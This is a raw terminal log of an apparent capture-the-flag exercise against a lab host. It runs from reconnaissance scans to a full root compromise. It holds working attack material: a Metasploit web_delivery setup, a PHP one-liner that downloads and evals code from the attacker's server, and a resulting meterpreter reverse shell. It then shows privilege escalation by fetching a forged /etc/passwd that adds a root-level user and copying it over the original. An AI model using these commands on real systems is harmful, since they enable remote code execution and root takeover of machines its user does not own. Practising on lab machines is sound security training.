@@ -1,0 +1,320 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 20:38 IST
+Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 20.00% done; ETC: 20:39 (0:00:24 remaining)
+Nmap scan report for 10.10.3.4
+Host is up (0.19s latency).
+Not shown: 990 closed ports
+PORT     STATE SERVICE     VERSION
+25/tcp   open  ftp         vsftpd 3.0.2
+|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      37932/tcp   mountd
+|   100005  1,2,3      45747/tcp6  mountd
+|   100005  1,2,3      55925/udp   mountd
+|   100005  1,2,3      59349/udp6  mountd
+|   100021  1,3,4      36270/tcp6  nlockmgr
+|   100021  1,3,4      44764/udp   nlockmgr
+|   100021  1,3,4      53008/tcp   nlockmgr
+|   100021  1,3,4      58899/udp6  nlockmgr
+|   100024  1          41075/tcp6  status
+|   100024  1          44495/tcp   status
+|   100024  1          50125/udp   status
+|   100024  1          53379/udp6  status
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+1322/tcp open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
+|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
+|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
+|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (ED25519)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+8081/tcp open  http        Apache httpd 2.4.7
+|_http-generator: Joomla! 1.5 - Open Source Content Management
+| http-robots.txt: 14 disallowed entries
+| /administrator/ /cache/ /components/ /images/
+| /includes/ /installation/ /language/ /libraries/ /media/
+|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+9000/tcp open  http        Jetty winstone-2.9
+| http-robots.txt: 1 disallowed entry
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\user (Local User)
+S-1-22-1-1002 Unix User\admin (Local User)
+
+
+S-1-5-21-2204397093-1859341111-647743004-1000 CTF\user (Local User)
+S-1-5-21-2204397093-1859341111-647743004-1001 CTF\admin (Local User)
+S-1-5-21-2204397093-1859341111-647743004-1002 CTF\root (Local User)
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/zsecurity# dirb http://10.10.3.4
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov  4 20:43:02 2020
+URL_BASE: http://10.10.3.4/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.3.4/ ----
++ http://10.10.3.4/cgi-bin/ (CODE:403|SIZE:284)                                                                         
++ http://10.10.3.4/index.html (CODE:200|SIZE:350)                                                                       
+==> DIRECTORY: http://10.10.3.4/javascript/                                                                             
+==> DIRECTORY: http://10.10.3.4/phpmyadmin/                                                                             
++ http://10.10.3.4/server-status (CODE:403|SIZE:289)
+Found /phpmyadmin/
+then found out that we can use dvwa to exploit the system
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h 10.10.3.4
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.3.4
++ Target Hostname:    10.10.3.4
++ Target Port:        80
++ Start Time:         2020-11-04 20:43:15 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 15e, size: 5b1803b4785d8, mtime: gzip
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ OSVDB-3268: /test/: Directory indexing found.
++ OSVDB-3092: /test/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
+
+
+msf6 > use 1
+[*] Using configured payload python/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+msf6 exploit(multi/script/web_delivery) > set target 1
+target => 1
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   PHP
+
+
+msf6 exploit(multi/script/web_delivery) > set lhost tun0
+lhost => 10.9.81.62
+msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] Using URL: http://0.0.0.0:8080/NfoN01o
+msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://172.27.180.145:8080/NfoN01o
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.9.81.62:8080/NfoN01o', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 10.10.3.4        web_delivery - Delivering Payload (1111 bytes)
+[*] Sending stage (39282 bytes) to 10.10.3.4
+[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.3.4:43762) at 2020-11-04 20:56:58 +0530
+
+
+
+msf6 exploit(multi/script/web_delivery) > sessions -t
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information          Connection
+  --  ----  ----                   -----------          ----------
+  1         meterpreter php/linux  www-data (33) @ ctf  10.9.81.62:4444 -> 10.10.3.4:43762 (10.10.3.4)
+
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer    : ctf
+OS          : Linux ctf 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686
+Meterpreter : php/linux
+meterpreter >
+
+
+meterpreter > shell
+Process 2304 created.
+Channel 0 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@ctf:/var/www/html/main/dvwa/vulnerabilities/exec$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ctf:/var/www/html/main/dvwa/vulnerabilities/exec$
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/zsecurity# openssl passwd -1 -salt akshay pass123
+$1$akshay$TSPtNluzwaxUu8Ou91LK31
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/zsecurity# nano passwd
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/zsecurity# cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+landscape:x:104:111::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+tomcat7:x:106:114::/usr/share/tomcat7:/bin/false
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
+admin:x:1002:1002:,,,:/home/admin:/bin/bash
+statd:x:108:65534::/var/lib/nfs:/bin/false
+jenkins:x:109:117:Jenkins,,,:/var/lib/jenkins:/bin/bash
+akshay:$1$akshay$TSPtNluzwaxUu8Ou91LK31:0:0:root:/root:/bin/bash
+
+
+Attach the hash to the end of passwd file.
+
+and then use the /bin/cp to copy the edited passwd to the orignal passwd
+
+www-data@ctf:/tmp$ wget http://10.9.81.62:8000/passwd
+wwget http://10.9.81.62:8000/passwd
+No command 'wwget' found, did you mean:
+ Command 'wget' from package 'wget' (main)
+ Command 'pwget' from package 'pwget' (universe)
+ Command 'owget' from package 'ow-shell' (universe)
+wwget: command not found
+www-data@ctf:/tmp$ wget http://10.9.81.62:8000/passwd
+wget http://10.9.81.62:8000/passwd
+--2020-11-04 17:37:19--  http://10.9.81.62:8000/passwd
+Connecting to 10.9.81.62:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1512 (1.5K) [application/octet-stream]
+Saving to: 'passwd'
+
+100%[======================================>] 1,512       --.-K/s   in 0s
+
+2020-11-04 17:37:20 (247 MB/s) - 'passwd' saved [1512/1512]
+
+www-data@ctf:/tmp$ /bin/cp passwd /etc/passwd
+/bin/cp passwd /etc/passwd
+
+
+www-data@ctf:/tmp$ su akshay
+su akshay
+Password: pass123
+
+Added user akshay.
+
+root@ctf:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ctf:/tmp# cd /root
+
+
+root@ctf:~# cat maybefinallythis.txt
+cat maybefinallythis.txt
+S040VzQ1RDNKUVlHUVgyVE9aUVc0V0taTlJQVUtNQlFNNVpIQ1gyMktKUFRDTVpURzU2UT09PT0=
+root@ctf:~#
+
+The encoded string can be decoded by using:
+
+Base64 -> Base32 > ROT13
+
+Flag{Y0u_Fin###############}
